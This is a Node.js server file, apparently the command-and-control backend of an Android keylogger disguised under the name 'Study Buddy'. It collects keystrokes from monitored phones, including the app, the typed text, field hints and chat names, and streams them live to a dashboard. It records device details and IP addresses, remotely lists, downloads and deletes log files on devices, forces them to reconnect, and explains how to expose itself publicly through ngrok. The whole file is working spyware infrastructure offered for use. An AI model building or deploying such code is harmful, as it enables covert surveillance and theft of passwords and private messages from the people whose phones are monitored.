const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');
const app = express();
const server = createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling'],
    allowEIO3: true
});
const port = 8080;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Store logs in memory
let logs = [];
let liveKeyloggingEnabled = true; // Enable by default
const savedConnections = new Map(); // Store connection info automatically
let connectedClients = new Map(); // Track connected Android devices

// Android device configuration
const ANDROID_DEVICE_IP = process.env.ANDROID_IP || 'localhost';
const ANDROID_FILE_PORT = 8081;

// API Routes
app.post('/keylog', (req, res) => {
    try {
        const data = req.body;
        data.server_time = new Date().toISOString();
        
        // Only store logs if live keylogging is enabled
        if (liveKeyloggingEnabled) {
            logs.push(data);
            
            console.log(`\n🔑 NEW KEYLOG (LIVE):`);
            console.log(`   📱 App: ${data.package || 'Unknown'}`);
            console.log(`   📝 Text: ${data.text || ''}`);
            console.log(`   🏷️  View: ${data.viewId || 'Unknown'}`);
            console.log(`   💡 Hint: ${data.hint || ''}`);
            console.log(`   ⏰ Time: ${data.timestamp || 'Unknown'}`);
            console.log(`   🖥️  Server: ${data.server_time}`);
            console.log('-'.repeat(50));
        } else {
            console.log(`🔑 Keylog received but live logging is DISABLED`);
        }
        
        res.json({ status: 'success', message: 'Keylog received' });
    } catch (error) {
        console.error('❌ Error receiving keylog:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/logs', (req, res) => {
    res.json({
        status: 'success',
        count: logs.length,
        logs: logs
    });
});


app.post('/api/clear', (req, res) => {
    logs = [];
    res.json({ status: 'success', message: 'Logs cleared' });
});

app.get('/api/status', (req, res) => {
    res.json({
        status: 'running',
        logs_count: logs.length,
        live_keylogging: liveKeyloggingEnabled,
        server_time: new Date().toISOString()
    });
});

// Live keylogging toggle endpoints
app.post('/api/toggle-live', (req, res) => {
    try {
        const { enabled } = req.body;
        liveKeyloggingEnabled = enabled === true;
        
        console.log(`🔄 Live keylogging ${liveKeyloggingEnabled ? 'ENABLED' : 'DISABLED'}`);
        
        res.json({ 
            status: 'success', 
            enabled: liveKeyloggingEnabled,
            message: `Live keylogging ${liveKeyloggingEnabled ? 'enabled' : 'disabled'}` 
        });
    } catch (error) {
        console.error('❌ Error toggling live keylogging:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/live-status', (req, res) => {
    res.json({
        status: 'success',
        enabled: liveKeyloggingEnabled
    });
});

// File management endpoints - now handled via WebSocket
app.get('/api/device/list-logs', (req, res) => {
    res.json({
        status: 'error',
        message: 'File management now handled via WebSocket. Use the web UI to manage files.'
    });
});

app.get('/api/device/download-log', async (req, res) => {
    try {
        const { date } = req.query;
        if (!date) {
            return res.status(400).json({ status: 'error', message: 'Date parameter required' });
        }
        
        const response = await fetch(`http://${ANDROID_DEVICE_IP}:${ANDROID_FILE_PORT}/api/download-log?date=${date}`);
        if (response.ok) {
            const buffer = await response.arrayBuffer();
            res.set({
                'Content-Type': 'application/gzip',
                'Content-Disposition': `attachment; filename="study_logs_${date}.gz"`
            });
            res.send(Buffer.from(buffer));
        } else {
            res.status(404).json({
                status: 'error',
                message: 'Log file not found for date: ' + date
            });
        }
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Download failed: ' + error.message
        });
    }
});

app.delete('/api/device/delete-log', async (req, res) => {
    try {
        const { date } = req.query;
        if (!date) {
            return res.status(400).json({ status: 'error', message: 'Date parameter required' });
        }
        
        const response = await fetch(`http://${ANDROID_DEVICE_IP}:${ANDROID_FILE_PORT}/api/delete-log?date=${date}`, {
            method: 'DELETE'
        });
        
        if (response.ok) {
            const data = await response.json();
            res.json(data);
        } else {
            res.status(404).json({
                status: 'error',
                message: 'Log file not found for date: ' + date
            });
        }
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Delete failed: ' + error.message
        });
    }
});

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    console.log('📱 Android device connected:', socket.id);
    console.log('📊 Total connected clients:', connectedClients.size + 1);
    console.log('🔍 Connection details:', {
        id: socket.id,
        address: socket.handshake.address,
        headers: socket.handshake.headers,
        query: socket.handshake.query
    });
    
    // Test connection immediately
    socket.emit('test-connection', { message: 'Server is working!' });
    
    // Get device info from connection - try multiple sources for real IP
    let clientIP = socket.handshake.address || socket.conn.remoteAddress || 'Unknown';
    
    // Try to get real IP from headers (useful when behind proxy/ngrok)
    const forwarded = socket.handshake.headers['x-forwarded-for'];
    const realIP = socket.handshake.headers['x-real-ip'];
    
    if (forwarded) {
        clientIP = forwarded.split(',')[0].trim();
        console.log('📱 Using X-Forwarded-For IP:', clientIP);
    } else if (realIP) {
        clientIP = realIP;
        console.log('📱 Using X-Real-IP:', clientIP);
    }
    
    // Handle IPv6 localhost (::1) and other IPv6 addresses
    if (clientIP === '::1' || clientIP === '::ffff:127.0.0.1') {
        clientIP = '127.0.0.1'; // Convert to IPv4 localhost
    } else if (clientIP.startsWith('::ffff:')) {
        // Extract IPv4 from IPv6-mapped address
        clientIP = clientIP.substring(7);
    } else if (clientIP.includes(':')) {
        // It's a pure IPv6 address, we can't use it for HTTP requests
        console.log('⚠️ Got IPv6 address:', clientIP, '- cannot use for reconnection');
        clientIP = 'Unknown';
    }
    
    const deviceInfo = {
        id: socket.id,
        name: `Device ${socket.id.substring(0, 8)}`,
        connectedAt: new Date(),
        lastSeen: new Date(),
        liveKeylogging: false,
        isOnline: true,
        clientIP: clientIP,
        reconnectIP: clientIP // Store IP for reconnection
    };
    
    console.log('📱 Device connected with IP:', clientIP);
    console.log('📱 Socket ID:', socket.id);
    console.log('📱 Total connected clients:', connectedClients.size + 1);
    
    connectedClients.set(socket.id, deviceInfo);
    
    // Auto-save connection info
    savedConnections.set(socket.id, {
        ...deviceInfo,
        savedAt: new Date().toISOString()
    });
    
    // Send initial live keylogging status to the newly connected device
    socket.emit('live-keylogging-status', { enabled: liveKeyloggingEnabled });
    console.log('📤 Sent initial live-keylogging-status to new device:', { enabled: liveKeyloggingEnabled });
    
    console.log('💾 Connection saved automatically');
    
    // Handle device info from Android
    socket.on('device-info', (data) => {
        console.log('📱 Received device info:', data);
        
        // Update connection with device info
        if (savedConnections.has(socket.id)) {
            const connection = savedConnections.get(socket.id);
            connection.deviceName = data.deviceName || 'Unknown Device';
            connection.os = data.os || 'Android';
            connection.version = data.version || 'Unknown';
            connection.manufacturer = data.manufacturer || 'Unknown';
            connection.sdk = data.sdk || 0;
            connection.localIP = data.localIP || 'Unknown';
            
            // Create a meaningful name
            connection.name = `${data.manufacturer || 'Unknown'} ${data.deviceName || 'Device'}`;
            
            // Use device's local IP for reconnection (preferred over connection IP)
            if (data.localIP && data.localIP !== 'Unknown') {
                connection.reconnectIP = data.localIP;
                console.log('📱 Using device local IP for reconnection:', data.localIP);
            } else if (!connection.reconnectIP) {
                connection.reconnectIP = connection.clientIP;
            }
            
            savedConnections.set(socket.id, connection);
            console.log('📱 Device info updated:', connection.name, 'Reconnect IP:', connection.reconnectIP);
            
            // Save to localStorage
            saveConnections();
        }
    });
    
    // Handle live keylogging toggle
    socket.on('toggle-live-keylogging', (data) => {
        console.log('📡 Received toggle-live-keylogging event:', data);
        // Toggle the current state if no data provided
        if (data && typeof data.enabled === 'boolean') {
            liveKeyloggingEnabled = data.enabled;
        } else {
            liveKeyloggingEnabled = !liveKeyloggingEnabled;
        }
        console.log(`🔄 Live keylogging ${liveKeyloggingEnabled ? 'ENABLED' : 'DISABLED'}`);
        
        // Notify all connected Android devices
        io.emit('live-keylogging-status', { enabled: liveKeyloggingEnabled });
        console.log('📤 Broadcasted live-keylogging-status to all Android devices:', { enabled: liveKeyloggingEnabled });
    });
    
    // Handle keylog data from Android
    socket.on('keylog', (data) => {
        console.log('📡 Received keylog from Android:', data);
        console.log('🔄 Live keylogging enabled:', liveKeyloggingEnabled);
        console.log('📊 Total logs in memory:', logs.length);
        
        if (liveKeyloggingEnabled) {
            data.server_time = new Date().toISOString();
            logs.push(data);
            
            console.log(`\n🔑 NEW KEYLOG (LIVE):`);
            console.log(`   📱 App: ${data.package || 'Unknown'}`);
            console.log(`   📝 Text: ${data.text || ''}`);
            console.log(`   🏷️  View: ${data.viewId || 'Unknown'}`);
            console.log(`   💡 Hint: ${data.hint || ''}`);
            console.log(`   👤 Chat: ${data.chatName || 'Unknown'}`);
            console.log(`   ⏰ Time: ${data.timestamp || 'Unknown'}`);
            console.log(`   🖥️  Server: ${data.server_time}`);
            console.log('-'.repeat(50));
            
            // Broadcast to all web clients
            io.emit('keylog-data', data);
            console.log('📤 Broadcasted keylog to web UI');
        } else {
            console.log('⚠️ Keylog received but live keylogging is DISABLED - ignoring');
        }
    });
    
    // Handle log files request from web UI - broadcast to all Android devices
    socket.on('request-log-files', () => {
        console.log('📁 Log files requested from web UI - broadcasting to all Android devices');
        console.log('📊 Total connected clients:', connectedClients.size);
        console.log('📊 Connected client IDs:', Array.from(connectedClients.keys()));
        console.log('📊 Connected clients details:', Array.from(connectedClients.values()));
        // Broadcast the request to all connected Android devices
        io.emit('request-log-files');
        console.log('📤 Broadcasted request-log-files to all clients');
    });
    
    // Handle log files list from Android
    socket.on('log-files-list', (files) => {
        console.log('📁 Received log files list from Android:', files);
        console.log('📊 Files count:', files.length);
        console.log('📊 Files details:', JSON.stringify(files, null, 2));
        // Forward to web UI - wrap in object
        io.emit('log-files-response', { files: files });
        console.log('📤 Forwarded log-files-response to web UI');
    });
    
    // Debug: Log all events from Android
    socket.onAny((eventName, ...args) => {
        console.log('🔍 Received event from Android:', eventName, args);
    });
    
    // Handle file download request from web UI - broadcast to all Android devices
    socket.on('download-log-file', (data) => {
        console.log('📥 File download requested from web UI:', data.date);
        console.log('📤 Broadcasting download request to all Android devices:', data);
        // Broadcast the download request to all connected Android devices
        io.emit('download-log-file', data);
        console.log('📤 Download request broadcasted to all Android devices');
    });
    
    // Handle file download data from Android
    socket.on('log-file-data', (data) => {
        console.log('📥 Received file data for:', data.date);
        // Forward to web UI for download
        io.emit('log-file-download', data);
    });
    
    // Handle file delete request from web UI - broadcast to all Android devices
    socket.on('delete-log-file', (data) => {
        console.log('🗑️ File delete requested from web UI:', data.date);
        console.log('📤 Broadcasting delete request to all Android devices:', data);
        // Broadcast the delete request to all connected Android devices
        io.emit('delete-log-file', data);
        console.log('📤 Delete request broadcasted to all Android devices');
    });
    
    // Handle file delete confirmation from Android
    socket.on('log-file-deleted', (data) => {
        console.log('🗑️ File deleted:', data.date);
        // Forward to web UI
        io.emit('log-file-delete-confirm', data);
    });
    
    // Handle disconnection
    socket.on('disconnect', () => {
        console.log('📱 Android device disconnected:', socket.id);
        
        // Mark as offline but keep in saved connections
        if (savedConnections.has(socket.id)) {
            const connection = savedConnections.get(socket.id);
            connection.isOnline = false;
            connection.lastSeen = new Date().toISOString();
            savedConnections.set(socket.id, connection);
        }
        
        connectedClients.delete(socket.id);
        console.log('📊 Total connected clients:', connectedClients.size);
    });
});

// Load saved connections from localStorage on startup
function loadSavedConnections() {
    try {
        const fs = require('fs');
        const path = require('path');
        const storageFile = path.join(__dirname, 'connections.json');
        
        if (fs.existsSync(storageFile)) {
            const data = fs.readFileSync(storageFile, 'utf8');
            const connections = JSON.parse(data);
            
            // Restore connections but mark as offline
            connections.forEach(conn => {
                conn.isOnline = false;
                savedConnections.set(conn.id, conn);
            });
            
            console.log('📱 Loaded', connections.length, 'saved connections from localStorage');
        }
    } catch (error) {
        console.error('❌ Error loading saved connections:', error.message);
    }
}

// Save connections to localStorage
function saveConnections() {
    try {
        const fs = require('fs');
        const path = require('path');
        const storageFile = path.join(__dirname, 'connections.json');
        
        const connections = Array.from(savedConnections.values());
        fs.writeFileSync(storageFile, JSON.stringify(connections, null, 2));
        
        console.log('💾 Saved', connections.length, 'connections to localStorage');
    } catch (error) {
        console.error('❌ Error saving connections:', error.message);
    }
}

// Load connections on startup
loadSavedConnections();

// Save connections every 30 seconds
setInterval(saveConnections, 30000);

// Simple connection management endpoints
app.get('/api/connections', (req, res) => {
    const connections = Array.from(savedConnections.values());
    res.json({
        status: 'success',
        connections: connections
    });
});

app.delete('/api/connections/:id', (req, res) => {
    try {
        const connectionId = req.params.id;
        
        if (!savedConnections.has(connectionId)) {
            return res.json({
                status: 'error',
                message: 'Connection not found'
            });
        }
        
        savedConnections.delete(connectionId);
        
        console.log('🗑️ Connection removed:', connectionId);
        
        res.json({
            status: 'success',
            message: 'Connection removed successfully'
        });
        
    } catch (error) {
        console.error('❌ Error removing connection:', error);
        res.json({
            status: 'error',
            message: 'Failed to remove connection: ' + error.message
        });
    }
});

// Delete all connections
app.delete('/api/connections/delete-all', (req, res) => {
    try {
        const count = savedConnections.size;
        savedConnections.clear();
        connectedClients.clear();
        saveConnections();
        
        console.log('🗑️ All connections deleted:', count);
        
        res.json({
            status: 'success',
            message: `Deleted ${count} connections successfully`
        });
        
    } catch (error) {
        console.error('❌ Error deleting all connections:', error);
        res.json({
            status: 'error',
            message: 'Failed to delete connections: ' + error.message
        });
    }
});

// Reconnect endpoint - triggers Android device to reconnect
app.post('/api/reconnect', async (req, res) => {
    try {
        console.log('🔄 Reconnect request received');
        
        const { connectionId, ip } = req.body;
        let targetIP = ip;
        
        // If connectionId is provided, get IP from saved connections
        if (connectionId && !ip) {
            const connection = savedConnections.get(connectionId);
            if (connection && connection.reconnectIP) {
                targetIP = connection.reconnectIP;
                console.log(`📱 Found saved connection: ${connection.name} (${targetIP})`);
            } else {
                return res.json({
                    status: 'error',
                    message: 'Connection not found or no IP available'
                });
            }
        }
        
        if (!targetIP || targetIP === 'Unknown') {
            return res.json({
                status: 'error',
                message: 'No valid IP address available for reconnection'
            });
        }
        
        // Try WebSocket-based reconnection first (more reliable)
        console.log(`📡 Attempting WebSocket-based reconnection for connection: ${connectionId}`);
        
        // Find the socket for this connection
        const socket = Array.from(io.sockets.sockets.values()).find(s => s.id === connectionId);
        
        if (socket && socket.connected) {
            console.log('✅ Device is already connected via WebSocket - triggering reconnect');
            socket.emit('force-reconnect');
            
            res.json({
                status: 'success',
                message: 'WebSocket reconnection triggered successfully',
                device: targetIP,
                method: 'websocket'
            });
            return;
        }
        
        // Fallback to HTTP reconnection
        const reconnectPort = 8082;
        console.log(`📡 Device not connected via WebSocket, trying HTTP reconnection at ${targetIP}:${reconnectPort}`);
        
        try {
            const response = await fetch(`http://${targetIP}:${reconnectPort}/reconnect`, {
                method: 'GET',
                timeout: 10000,
                headers: {
                    'User-Agent': 'StudyBuddy-Server/1.0'
                }
            });
            
            if (response.ok) {
                console.log('✅ Android device HTTP reconnection triggered successfully');
                res.json({
                    status: 'success',
                    message: 'HTTP reconnection triggered successfully',
                    device: targetIP,
                    method: 'http'
                });
            } else {
                console.log('⚠️ Android device responded with error:', response.status);
                res.json({
                    status: 'error',
                    message: 'Android device responded with error',
                    statusCode: response.status,
                    method: 'http'
                });
            }
        } catch (httpError) {
            console.log('❌ HTTP reconnection failed, trying alternative methods...');
            console.log('❌ HTTP Error details:', httpError.message);
            
            // Check how many devices are currently connected
            const connectedDevices = Array.from(io.sockets.sockets.values()).filter(s => s.connected);
            console.log(`📊 Currently connected devices: ${connectedDevices.length}`);
            
            if (connectedDevices.length > 0) {
                // Try to broadcast reconnect to all connected devices
                console.log('📡 Broadcasting reconnect to all connected devices...');
                io.emit('force-reconnect-all');
                
                res.json({
                    status: 'partial',
                    message: `HTTP reconnection failed, but broadcast reconnect sent to ${connectedDevices.length} connected devices`,
                    device: targetIP,
                    method: 'broadcast',
                    connectedDevices: connectedDevices.length,
                    httpError: httpError.message
                });
            } else {
                console.log('❌ No devices connected - cannot send broadcast reconnect');
                res.json({
                    status: 'error',
                    message: 'HTTP reconnection failed and no devices are connected to receive broadcast',
                    device: targetIP,
                    method: 'none',
                    connectedDevices: 0,
                    httpError: httpError.message
                });
            }
        }
        
    } catch (error) {
        console.error('❌ Error triggering reconnection:', error);
        console.error('❌ Error details:', {
            message: error.message,
            code: error.code,
            cause: error.cause,
            stack: error.stack
        });
        res.json({
            status: 'error',
            message: 'Failed to trigger reconnection: ' + error.message,
            details: {
                code: error.code,
                cause: error.cause
            }
        });
    }
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Server status endpoint
app.get('/api/status', (req, res) => {
    const localIP = getLocalIP();
    res.json({
        status: 'running',
        port: port,
        urls: {
            local: `http://localhost:${port}`,
            network: `http://${localIP}:${port}`,
            websocket: `ws://localhost:${port}/socket.io/`,
            networkWebsocket: `ws://${localIP}:${port}/socket.io/`
        },
        connectedClients: connectedClients.size,
        liveKeylogging: liveKeyloggingEnabled,
        uptime: process.uptime()
    });
});

// Server info page
app.get('/info', (req, res) => {
    const localIP = getLocalIP();
    const uptime = Math.floor(process.uptime());
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Study Buddy Server Info</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h1 { color: #FF6B9D; margin-bottom: 20px; }
                .url-box { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #FF6B9D; }
                .url-box a { color: #FF6B9D; text-decoration: none; font-weight: bold; }
                .url-box a:hover { text-decoration: underline; }
                .status { background: #d4edda; color: #155724; padding: 10px; border-radius: 5px; margin: 10px 0; }
                .info { background: #e2e3e5; padding: 10px; border-radius: 5px; margin: 10px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📚 Study Buddy Server</h1>
                
                <div class="status">
                    ✅ Server is running on port ${port}
                </div>
                
                <h3>🌐 Access URLs:</h3>
                <div class="url-box">
                    <strong>Local Access:</strong><br>
                    <a href="http://localhost:${port}" target="_blank">http://localhost:${port}</a>
                </div>
                
                <div class="url-box">
                    <strong>Network Access:</strong><br>
                    <a href="http://${localIP}:${port}" target="_blank">http://${localIP}:${port}</a>
                </div>
                
                <h3>📡 WebSocket URLs:</h3>
                <div class="url-box">
                    <strong>Local WebSocket:</strong><br>
                    ws://localhost:${port}/socket.io/
                </div>
                
                <div class="url-box">
                    <strong>Network WebSocket:</strong><br>
                    ws://${localIP}:${port}/socket.io/
                </div>
                
                <h3>📊 Server Status:</h3>
                <div class="info">
                    <strong>Connected Clients:</strong> ${connectedClients.size}<br>
                    <strong>Live Keylogging:</strong> ${liveKeyloggingEnabled ? 'Enabled' : 'Disabled'}<br>
                    <strong>Uptime:</strong> ${hours}h ${minutes}m ${seconds}s
                </div>
                
                <h3>📱 For Android App:</h3>
                <div class="info">
                    1. Install ngrok: <a href="https://ngrok.com/download" target="_blank">https://ngrok.com/download</a><br>
                    2. Run: <code>ngrok http ${port}</code><br>
                    3. Copy the HTTPS URL (e.g., https://abc123.ngrok.io)<br>
                    4. Update NGROK_URL in StudyTrackingService.java
                </div>
            </div>
        </body>
        </html>
    `);
});

// Get local IP address for network access
const os = require('os');
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'localhost';
}

// Start server - Listen on all interfaces (0.0.0.0) to accept connections from localhost and network
server.listen(port, '0.0.0.0', () => {
    const localIP = getLocalIP();
    
    console.log('🚀 Study Buddy Server Started!');
    console.log('='.repeat(60));
    console.log(`🌐 LOCAL URL: http://localhost:${port}`);
    console.log(`🌐 NETWORK URL: http://${localIP}:${port}`);
    console.log('📡 WebSocket ready for Android app connections');
    console.log('📡 Server is listening on ALL INTERFACES (0.0.0.0)');
    console.log('');
    console.log('📱 FOR ANDROID APP - TWO OPTIONS:');
    console.log('');
    console.log('   OPTION 1: Direct Local WiFi Connection');
    console.log(`      • Connect to: http://${localIP}:${port}`);
    console.log('      • Make sure Android is on the same WiFi network');
    console.log('      • Update server URL in StudyTrackingService.java');
    console.log('');
    console.log('   OPTION 2: Public HTTPS via ngrok');
    console.log('      1. Install ngrok: https://ngrok.com/download');
    console.log('      2. Run: ngrok http 8080');
    console.log('      3. Copy the HTTPS URL (e.g., https://abc123.ngrok.io)');
    console.log('      4. Update NGROK_URL in StudyTrackingService.java');
    console.log('');
    console.log('🔗 Quick Access:');
    console.log(`   • Dashboard: http://localhost:${port}`);
    console.log(`   • Network Dashboard: http://${localIP}:${port}`);
    console.log(`   • Server Info: http://localhost:${port}/info`);
    console.log(`   • API Status: http://localhost:${port}/api/status`);
    console.log(`   • WebSocket: ws://localhost:${port}/socket.io/`);
    console.log(`   • Network WebSocket: ws://${localIP}:${port}/socket.io/`);
    console.log('='.repeat(60));
});
